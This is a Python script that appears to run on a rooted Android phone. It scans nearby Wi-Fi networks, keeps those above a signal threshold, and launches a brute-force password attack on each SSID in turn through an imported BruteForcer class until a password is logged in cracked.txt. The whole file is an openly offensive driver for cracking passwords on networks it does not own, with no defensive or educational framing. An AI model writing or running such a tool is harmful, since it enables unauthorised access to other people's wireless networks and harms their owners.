import subprocess
import time
from brute_forcer import BruteForcer  # assumes your file is named brute_wifi.py

SIGNAL_THRESHOLD = -80  # dBm; ignore very weak signals


def run_cmd(cmd):
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.returncode, result.stdout.strip(), result.stderr.strip()


def scan_networks():
    print("📡 Scanning available Wi-Fi networks with 'iw'...")
    code, out, err = run_cmd("su -c 'iw dev wlan0 scan | grep -E \"SSID|signal\"'")
    time.sleep(2)  # Give some time for the scan to complete
    if code != 0 or not out:
        print("❌ Failed to scan networks:", err or "No output.")
        return []

    lines = out.splitlines()
    networks = []
    ssid = None
    signal = -100

    for line in lines:
        line = line.strip()
        if line.startswith("signal:"):
            try:
                signal = float(line.split(":")[-1].strip().replace("dBm", "").strip())
            except:
                signal = -100
        elif line.startswith("SSID:"):
            ssid = line.split("SSID:")[-1].strip()
            if ssid and ssid != "":
                networks.append((ssid, int(signal)))

    # Remove duplicates: keep strongest signal
    unique = {}
    for ssid, sig in networks:
        if ssid not in unique or sig > unique[ssid]:
            unique[ssid] = sig

    # Filter by signal strength threshold
    return [(ssid, sig) for ssid, sig in unique.items() if sig >= SIGNAL_THRESHOLD]



def main():
    print("🔧 Enabling Wi-Fi before scanning...")
    run_cmd("su -c 'svc wifi enable'")
    time.sleep(3)

    scanned = scan_networks()
    if not scanned:
        print("❌ No Wi-Fi networks found.")
        return

    # Remove duplicates
    unique_ssids = list({s[0]: s for s in scanned}.values())
    print(f"✅ Found {len(unique_ssids)} candidate networks to try.")

    for ssid, signal in unique_ssids:
        print(f"\n🚀 Attacking SSID: {ssid} (Signal: {signal} dBm)")

        attacker = BruteForcer(ssid)
        attacker.main()

        # Check if password was cracked
        if check_cracked_file_for_ssid(ssid):
            print(f"🎉 Password for '{ssid}' found. Stopping.")
            break
    else:
        print("💀 Finished trying all networks. No password cracked.")


def check_cracked_file_for_ssid(ssid):
    try:
        with open("cracked.txt", "r") as f:
            for line in f:
                if line.startswith(ssid + ":"):
                    return True
    except:
        pass
    return False


if __name__ == "__main__":
    main()
